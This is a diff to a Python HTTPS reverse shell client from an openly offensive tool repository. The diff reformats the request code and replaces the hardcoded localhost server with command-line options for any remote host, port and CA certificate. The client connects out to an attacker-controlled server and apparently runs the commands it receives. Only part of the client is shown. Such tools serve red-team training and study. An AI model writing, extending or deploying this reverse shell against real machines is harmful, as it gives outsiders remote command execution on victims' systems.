@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell
+# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
@@ -57,8 +57,10 @@ class Client:
     def post(self, request_body: dict[str, str]) -> str:
         request_body: bytes = parse.urlencode(request_body).encode()
         url = request.Request(self.server_url, data=request_body)
-        return request.urlopen(url=url,
-                               context=self.ssl_context).read().decode()
+        return (request
+                .urlopen(url=url, context=self.ssl_context)
+                .read()
+                .decode())
 
     def execute(self) -> None:
         while True:
@@ -77,8 +79,28 @@ class Client:
 
 
 if __name__ == "__main__":
-    SERVER_ADDRESS = "localhost"
-    SERVER_PORT = 4443
-    CA_FILE = Path(__file__).parent.joinpath("ca.crt")
+    import argparse
 
-    Client(SERVER_ADDRESS, SERVER_PORT, CA_FILE).execute()
+    parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Client")
+    parser.add_argument("host",
+                        type=str,
+                        metavar="<hostname/address>",
+                        help="Address or hostname of the server to connect to.")
+    parser.add_argument("-p", "--port",
+                        type=int,
+                        required=True,
+                        metavar="<port>",
+                        help="Port number exposed by the server.")
+    parser.add_argument("--ca-cert",
+                        type=str,
+                        metavar="<path>",
+                        help="Absolute path to a file containing the "
+                             "certificate for the Certificate Authority (CA).")
+
+    _args = parser.parse_args()
+
+    Client(
+        server_address=_args.host,
+        server_port=_args.port,
+        ca_file=_args.ca_cert
+    ).execute()
